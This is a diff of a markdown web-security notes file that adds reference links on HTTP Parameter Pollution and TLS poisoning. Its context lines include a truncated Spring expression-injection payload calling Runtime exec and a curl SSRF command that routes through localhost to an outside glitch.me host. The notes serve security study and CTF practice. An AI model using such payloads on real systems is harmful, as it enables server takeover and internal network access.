@@ -86,6 +86,10 @@ RegExp.prototype.test = new Proxy(RegExp.prototype.test, {
     - https://blog.redteam.pl/2020/08/rocket-chat-xss-rce-cve-2020-15926.html
     - [#276031 Remote Code Execution in Rocket.Chat Desktop - HackerOne](https://hackerone.com/reports/276031)
 
+# HTTP Parameter Pollution
+
+- http://www.benhayak.com/2019/07/blog-post.html
+
 # DOM clobbering
 
 - https://xss.pwnfunction.com/challenges/ww3/
@@ -137,6 +141,7 @@ GET /path?lang=__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(
         - https://www.tasteless.eu/post/2014/02/olympic-ctf-sochi-2014-xnginx-writeup/
 - https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery
 - [PHP :: Sec Bug \#79329 :: get\_headers\(\) silently truncates after a null byte](https://bugs.php.net/bug.php?id=79329)
+- https://github.com/jmdx/TLS-poison/
 
 ```bash
 curl -v 'https://let-me-see.pwn.institute/' -G --data-urlencode 'url=http://127.0.0.1/?url=http://daffy-malleable-tote.glitch.me/go'
